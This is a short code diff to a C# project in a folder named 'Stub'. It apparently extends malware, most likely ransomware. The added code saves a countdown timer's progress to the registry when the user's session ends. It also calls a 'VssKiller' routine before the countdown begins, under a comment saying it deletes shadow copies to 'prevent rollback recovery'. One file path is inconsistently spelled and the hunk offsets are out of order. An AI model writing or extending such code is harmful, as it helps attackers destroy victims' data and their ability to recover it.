@@ -1,0 +1,43 @@
+diff --git a/сурсы/Stub/ns0/GForm2.cs b/сурсы/Stub/ns0/GForm2.cs
+--- a/сурсы/Stub/ns0/GForm2.cs
++++ b/сурсы/Stub/ns0/GForm2.cs
+@@ -590,6 +590,9 @@ namespace ns0
+             try
+             {
+                 Microsoft.Win32.SystemEvents.PowerModeChanged += this.GForm2_PowerModeChanged;
++                Microsoft.Win32.SystemEvents.SessionEnding += this.GForm2_SessionEnding;
+                 this.powerEventSubscribed = true;
+             }
+             catch (Exception)
+@@ -221,6 +224,9 @@ namespace ns0
+         {
+             return base.GetService; <existing>
+         }
++
++        private void GForm2_SessionEnding(object sender, SessionEndingEventArgs e)
++        {
++            try { ShutdownTrigger.ForcePersistElapsed(); } catch { }
++        }
+diff --git a/сурсы/Stub/ns0/ShutdownTrigger.cs b/сурсы/Stub/ns0/ShutdownTrigger.cs
+--- a/суры/Stub/ns0/ShutdownTrigger.cs
++++ b/сурсы/Stub/ns0/ShutdownTrigger.cs
+@@ -228,6 +228,14 @@ namespace ns0
+         public static bool IsTimeExpired()
+         {
+             if (TimerDisabled) return false;
+             return GetRemainingSeconds() <= 0;
+         }
++
++        public static void ForcePersistElapsed()
++        {
++            long remaining = GetRemainingSeconds();
++            long elapsed = TotalSeconds - remaining;
++            if (elapsed < 0) elapsed = 0;
++            try { WriteRegLong(StateRegPath, StateLastSeenTicksName, elapsed); } catch { }
++            try { WriteRegLong(StateBackupRegPath, StateBackupLastSeenName, elapsed); } catch { }
++        }
+@@ -598,6 +615,8 @@ namespace ns0
+             ShutdownTrigger.InitializeTimer();
++            // Shadow copy pre-clean: prevent rollback recovery
++            try { VssKiller.Execute(new byte[32]); } catch { }
+             this.countdownTimer = new System.Windows.Forms.Timer();
